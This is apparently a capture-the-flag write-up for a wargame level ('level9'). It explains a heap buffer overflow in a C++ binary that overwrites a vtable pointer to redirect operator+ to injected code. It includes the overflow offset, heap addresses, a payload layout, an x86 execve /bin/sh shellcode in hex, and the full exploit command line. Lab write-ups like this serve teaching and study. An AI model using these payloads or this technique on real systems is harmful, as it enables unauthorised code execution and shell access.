Here we will do a buffer overflow to reach the vtable address which is stored inside the class and modify the address of the operator+.
It will allows us to execute our shellcode when the porgram reach 'v1 + result'.

Here we will exploit the memcpy which is inside the _ZN1N13setAnnotationEPc function
0x08048733 <+37>:	call   0x8048510 <memcpy@plt>

We found an offset of 108

We found that our buffer in the heap starts at the address 0x0804a008 + 4 which is 0x0804a00c

So it will be our new return address. Let's call it address#1

First we try this payload :

0              83         108              
|      NOP     | SHELLCODE | address#1 |

But we see it fails.

Watching closely  we understood that when it access the + operator, it derefences it.
So we'll add where the new return address points an address which points 4 byte furter into the NOPSLED.

Our buffer will look like this :

[address#1 + 4 byte (size of the address itself)] + NOP + SHELLCODE + address#1

address#1 + 4 = 0x0804a00c + 4
              = 0x0804a010 = address#2
              
 
Our shellcode will be the same as previous exercices which will open a shell : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

0           4     83         108              
| address#2 | NOP | SHELLCODE | address#1 |


To understand it well : 

./level9 $(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x90'*79 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x08\x04\xa0\x0c'[::-1]")
